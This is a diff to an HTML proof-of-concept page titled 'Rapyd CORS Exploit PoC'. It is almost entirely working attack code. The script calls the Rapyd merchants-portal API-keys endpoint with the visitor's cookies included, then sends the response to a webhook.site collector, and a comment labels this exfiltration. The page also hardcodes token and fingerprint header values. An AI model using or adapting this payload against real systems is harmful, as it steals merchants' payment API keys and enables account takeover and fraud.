@@ -1,14 +1,29 @@
-<script>
-  fetch("https://dashboard.rapyd.net/v1/merchants-portal/organization/api-keys", {
-    method: "GET",
-    credentials: "include"
-  })
-  .then(res => res.text())
-  .then(data => {
-    fetch("https://webhook.site/57d05575-394e-4d7f-b280-b805ce1da79e", {
-      method: "POST",
-      mode: "no-cors",
-      body: data
-    });
-  });
-</script>
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>💣 Rapyd CORS Exploit PoC</h2>
+    <script>
+      const headers = {
+        "Content-Type": "application/json",
+        "Token": "2f6ca9c1-ab32-4c8d-b0d7-1cac1a030f18",
+        "Fingerprint": "fa2608d4ae3c0168c840f76d7d962aaf"
+      };
+
+      fetch("https://dashboard.rapyd.net/v1/merchants-portal/organization/api-keys", {
+        method: "GET",
+        credentials: "include",
+        headers: headers // Correctly pass headers here
+      })
+        .then(response => response.text())
+        .then(data => {
+          // Exfiltrate to your webhook
+          fetch("https://webhook.site/57d05575-394e-4d7f-b280-b805ce1da79e", {
+            method: "POST",
+            mode: "no-cors",
+            body: data
+          });
+        })
+        .catch(err => console.error("Exploit failed:", err));
+    </script>
+  </body>
+</html>
